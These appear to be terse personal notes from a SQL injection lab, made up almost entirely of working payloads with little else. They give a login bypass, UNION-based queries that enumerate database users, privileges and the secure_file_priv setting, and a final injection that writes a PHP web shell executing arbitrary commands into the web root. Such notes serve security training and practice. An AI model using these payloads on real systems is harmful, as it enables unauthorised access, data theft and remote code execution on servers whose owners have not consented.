____

# Authentication bypass

```sql
admin' or 1=1#
```

# Database enum

```sql
test' union select 1,2,3,4,5-- -
```

![[Pasted image 20240928132338.png]]

## User

```txt
root@localhost
```


```sql
test' union select 1,2,3,grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![[Pasted image 20240928132722.png]]

```sql
test' union select 1,2,3,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![[Pasted image 20240928132821.png]]

# Web shell

```aql
test' union select 1,'<?php system($_REQUEST[0]); ?>', 3,4,5 into outfile '/var/www/html/dashboard/shell.php'-- -
```

